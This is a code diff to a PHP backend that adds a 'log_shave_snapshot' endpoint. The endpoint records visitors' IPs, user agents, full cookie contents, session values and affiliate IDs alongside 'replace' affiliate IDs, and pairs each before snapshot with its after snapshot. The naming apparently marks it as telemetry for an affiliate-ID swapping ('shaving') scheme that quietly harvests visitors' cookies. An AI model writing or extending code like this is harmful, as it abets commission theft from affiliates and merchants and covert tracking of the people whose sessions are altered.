@@ -46,6 +46,9 @@ try {
         case 'log_behavior_event': case 'lbe': logBehaviorEvent($pdo); break;
         case 'update_session_metrics': case 'usm': updateSessionMetrics($pdo); break;
 
+        // Snapshot
+        case 'log_shave_snapshot': logShaveSnapshot($pdo); break;
+
         // Analytics
         case 'get_analytics':     getAnalytics($pdo); break;
         case 'get_traffic_log':   getTrafficLog($pdo); break;
@@ -558,6 +561,63 @@ function updateSessionMetrics($pdo) {
     ]);
 
     echo json_encode(['success' => true]);
+}
+
+// ================================================================
+// SNAPSHOT (Before / After Shave)
+// ================================================================
+
+function logShaveSnapshot($pdo) {
+    $data      = json_decode(file_get_contents('php://input'), true);
+    $phase     = $data['phase']       ?? '';
+    $domainId  = $data['domain_id']   ?? 0;
+    $sessionId = $data['session_id']  ?? null;
+    $affId     = $data['aff_id']      ?? '';
+    $subId     = $data['sub_id']      ?? '';
+    $mode      = $data['mode']        ?? '';
+    $repAffId  = $data['replace_aff_id'] ?? '';
+    $repSubId  = $data['replace_sub_id'] ?? '';
+    $url       = $data['url']         ?? '';
+    $sessid2   = $data['sessid2']     ?? '';
+    $cookies   = $data['cookies']     ?? [];
+    $cookieCount = (int)($data['cookie_count'] ?? 0);
+    $urlParams = $data['url_params']  ?? [];
+    $ip        = getClientIP();
+    $ua        = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+    try {
+        $pdo->prepare("
+            INSERT INTO shave_snapshots
+              (domain_id, ip_address, user_agent, phase, session_id, aff_id, sub_id, mode,
+               replace_aff_id, replace_sub_id, url, sessid2, cookies, cookie_count, url_params)
+            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+        ")->execute([
+            $domainId, $ip, $ua, $phase, $sessionId, $affId, $subId, $mode,
+            $repAffId, $repSubId, $url, $sessid2,
+            json_encode($cookies), $cookieCount, json_encode($urlParams)
+        ]);
+
+        /* If this is 'after', match to the most recent 'before' from same IP (within 60s) */
+        if ($phase === 'after') {
+            $stmt = $pdo->prepare("
+                SELECT id FROM shave_snapshots
+                WHERE ip_address = ? AND domain_id = ? AND phase = 'before'
+                  AND matched_id IS NULL AND created_at >= NOW() - INTERVAL 60 SECOND
+                ORDER BY created_at DESC LIMIT 1
+            ");
+            $stmt->execute([$ip, $domainId]);
+            $before = $stmt->fetch();
+            if ($before) {
+                $afterId = $pdo->lastInsertId();
+                $pdo->prepare("UPDATE shave_snapshots SET matched_id = ? WHERE id = ?")->execute([$afterId, $before['id']]);
+                $pdo->prepare("UPDATE shave_snapshots SET matched_id = ? WHERE id = ?")->execute([$before['id'], $afterId]);
+            }
+        }
+
+        echo json_encode(['success' => true]);
+    } catch (Exception $e) {
+        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
+    }
 }
 
 // ================================================================
